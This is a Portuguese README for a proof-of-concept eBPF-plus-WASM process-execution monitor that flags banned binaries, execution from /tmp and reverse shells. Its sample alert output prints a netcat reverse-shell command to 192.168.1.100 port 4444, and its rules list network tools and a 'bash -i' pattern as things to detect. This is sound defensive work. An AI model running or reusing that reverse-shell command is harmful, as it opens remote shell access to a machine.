Projeto de prova de conceito para pipeline de segurança combinando **eBPF** (observabilidade kernel-level) + **WASM** (policy engine sandbox).

**Limitação:** eBPF não executa no WSL2. Requer Linux kernel nativo.

---

## Arquitetura
┌─────────────┐     ┌─────────────┐     ┌─────────────┐     ┌─────────────┐
│   eBPF      │────▶│   Loader    │────▶│    WASM     │────▶│   Alerts    │
│  Kernel     │     │   Rust      │     │   Policy    │     │   JSON      │
│  Events     │     │   Aya       │     │   Engine    │     │   Output    │
└─────────────┘     └─────────────┘     └─────────────┘     └─────────────┘
plain

---

## Estrutura
execguard/
├── execguard-agent/              # Agente WASM standalone (FUNCIONAL)
│   ├── src/main.rs               # Testes com eventos simulados
│   ├── src/wasm_runtime.rs       # Runtime Wasmtime
│   └── execguard.wasm            # Módulo WASM compilado
├── execguard-wasm/               # Módulo WASM (policy engine)
│   └── src/lib.rs                # Regras: banned, tmp, comm mismatch
├── execguard-ebpf-real/          # eBPF + Loader (COMPILA, NÃO EXECUTA NO WSL)
│   ├── execguard-ebpf/           # Programa eBPF kernel
│   ├── execguard-common/         # Structs compartilhadas
│   └── src/main.rs               # Loader userspace
├── docs/
│   └── LIMITACAO_WSL.md          # Documentação da limitação
└── scripts/
├── build.sh                  # Build WASM + agente
└── test.sh                   # Teste do agente
plain

---

## O que funciona

| Componente | Status | Como testar |
|-----------|--------|-------------|
| **WASM Policy Engine** | ✅ Funcional | `cd execguard-agent && cargo run` |
| **Agente Standalone** | ✅ Funcional | Eventos simulados + scoring |
| **eBPF Program** | ✅ Compila | `cd execguard-ebpf-real && sudo ./build-ebpf.sh` |
| **Loader Aya** | ✅ Compila | Loader Rust com async Tokio |
| **Integração eBPF→WASM** | ❌ Bloqueado | WSL não suporta `perf_event_open` |

---

## Quick Start

### 1. Clone e build

```bash
git clone https://github.com/SEU_USUARIO/execguard.git
cd execguard

# Build WASM + agente
./scripts/build.sh
2. Teste o agente (modo simulação)
bash
cd execguard-agent
cargo run --release
Output esperado:
plain
================================================================================
EXECGUARD - eBPF + WASM Security Pipeline
================================================================================

🚨 ALERT [Sev 10] BANNED_BINARY: UID 1000 banned: /tmp/nc -e /bin/bash 192.168.1.100 4444
🚨 ALERT [Sev 7] TMP_EXECUTION: UID 1001 exec from /tmp: /tmp/exploit.py
🚨 ALERT [Sev 5] COMM_MISMATCH: Comm 'python3' != file 'exploit.py'

[   127µs] PID=1234   UID=1000   RISK=10.0  FILE=/tmp/nc -e /bin/bash 192.168.1.100 4444
[    47µs] PID=1235   UID=0      RISK= 0.0  FILE=/usr/bin/sudo
[    49µs] PID=1236   UID=1001   RISK=10.0  FILE=/tmp/exploit.py
[    45µs] PID=1237   UID=1002   RISK= 0.0  FILE=/usr/bin/curl
3. Build eBPF (compila, não executa no WSL)
bash
cd execguard-ebpf-real
sudo ./build-ebpf.sh
Pipeline WASM
O módulo WASM implementa 3 etapas inline em um único módulo:
Table
Etapa	Função
Enrich	Adiciona contexto (UID, GID, timestamp)
Correlate	Consulta lista de binários proibidos (host function)
Score	Calcula risco 0-10 baseado em regras
Regras Implementadas
Table
Regra	Severidade	Condição
BANNED_BINARY	10	Binário na lista negra (nc, ncat, nmap, python)
TMP_EXECUTION	7	Não-root executando de /tmp/
COMM_MISMATCH	5	Nome do processo (comm) ≠ nome do arquivo
REVERSE_SHELL	9	Padrão bash -i detectado
Performance
Table
Métrica	Valor
Latência WASM	~50-130µs por evento
Throughput estimado	>10k eventos/segundo
Memória WASM	64KB (heap fixo, no_std)
Tamanho do módulo WASM	~15KB
Stack Técnico
Rust — Sistema seguro e performático
WASM (wasm32-unknown-unknown) — Sandbox de políticas extensível
Wasmtime — Runtime WASM com host functions customizadas
eBPF + Aya — Observabilidade kernel-level (compila, requer Linux nativo)
serde — Serialização zero-copy entre host e WASM
Limitação Crítica: WSL2
⚠️ WSL2 não suporta eBPF runtime
Table
Recurso	Status	Erro
tracefs	❌ Não disponível	mount: tracefs not found
debugfs/tracing	❌ Não disponível	Diretório não existe
perf_event_open	❌ Falha	No such file or directory
BPF_PROG_LOAD	⚠️ Verifier rejeita	last insn is not an exit or jmp
Causa: Kernel WSL2 não inclui CONFIG_TRACEPOINTS, CONFIG_PERF_EVENTS, CONFIG_DEBUG_FS.
Solução: Executar em Linux kernel nativo (Ubuntu, Debian, Fedora) ou VM cloud.
Ver docs/LIMITACAO_WSL.md para detalhes técnicos.
Como testar eBPF em Linux Nativo
bash
# Ubuntu/Debian nativo
sudo apt install linux-tools-common linux-tools-generic

# Build eBPF
cd execguard-ebpf-real
sudo ./build-ebpf.sh

# Executa loader (sem --simulate)
sudo ../target/release/execguard-loader --log-level info

# Em outro terminal, gera eventos reais
ls
cat /etc/passwd
bash -c "echo test"
Lições Aprendidas
WASM em no_std requer allocator customizado e cuidado com macros (vec!)
Arrays [u8; N] não implementam Serialize em no_std — usar Vec<u8>
Host functions precisam de interface clara entre Rust host e WASM guest
eBPF verifier é rigoroso — pequenos erros de código geram rejeição
WSL2 é ambiente de desenvolvimento, não produção — sempre validar em Linux nativo
Próximos Passos (se retomar)
[ ] Executar em VM Linux para validar eBPF real
[ ] Integrar eBPF → Loader → WASM (pipeline completo)
[ ] State persistente (RocksDB) para correlação temporal
[ ] Hot-reload de módulos WASM sem restart
[ ] Métricas Prometheus para observabilidade do próprio sistema
Licença
MIT
